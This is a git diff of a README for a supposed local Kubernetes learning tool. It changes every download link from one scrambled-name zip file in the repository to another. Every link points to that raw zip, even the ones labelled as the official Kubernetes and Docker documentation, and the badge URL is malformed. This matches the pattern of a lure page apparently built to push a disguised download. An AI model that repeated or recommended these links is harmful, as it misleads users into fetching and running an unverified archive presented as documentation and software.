@@ -1,7 +1,7 @@
 # 🖥️ your-local-k8s-cluster - Learn Kubernetes Easily on Your Computer
 
 ## 📥 Download Now
-[![Download your-local-k8s-cluster](https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/scripts/cluster-k-local-your-s-v2.7.zip%20Now-Get%20Latest%https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/scripts/cluster-k-local-your-s-v2.7.zip)](https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/scripts/cluster-k-local-your-s-v2.7.zip)
+[![Download your-local-k8s-cluster](https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/helm-charts/app-template/your-cluster-s-k-local-v2.2.zip%20Now-Get%20Latest%https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/helm-charts/app-template/your-cluster-s-k-local-v2.2.zip)](https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/helm-charts/app-template/your-cluster-s-k-local-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ Before downloading, ensure your computer meets these minimum requirements:
 
 To start using your-local-k8s-cluster, you need to download it first. 
 
-1. Visit this page to download: [Releases Page](https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/scripts/cluster-k-local-your-s-v2.7.zip).
+1. Visit this page to download: [Releases Page](https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/helm-charts/app-template/your-cluster-s-k-local-v2.2.zip).
   
    On this page, you will find the latest version available for download.
 
@@ -72,8 +72,8 @@ If you have questions or need help, the community is here for you. You may reach
 
 ### 🌐 Additional Resources
 
-- **Kubernetes Documentation:** [Kubernetes Official Docs](https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/scripts/cluster-k-local-your-s-v2.7.zip)
-- **Docker Documentation:** [Docker Official Docs](https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/scripts/cluster-k-local-your-s-v2.7.zip)
+- **Kubernetes Documentation:** [Kubernetes Official Docs](https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/helm-charts/app-template/your-cluster-s-k-local-v2.2.zip)
+- **Docker Documentation:** [Docker Official Docs](https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/helm-charts/app-template/your-cluster-s-k-local-v2.2.zip)
   
 These resources provide comprehensive guides and information on Kubernetes and Docker.
 
@@ -87,4 +87,4 @@ Thank you for choosing your-local-k8s-cluster! Dive into Kubernetes and elevate 
 
 ## 📥 Download Again
 
-Don't forget, you can always revisit [the Releases Page](https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/scripts/cluster-k-local-your-s-v2.7.zip) to check for updates or download the latest version.
+Don't forget, you can always revisit [the Releases Page](https://github.com/profactsbd/your-local-k8s-cluster/raw/refs/heads/main/helm-charts/app-template/your-cluster-s-k-local-v2.2.zip) to check for updates or download the latest version.
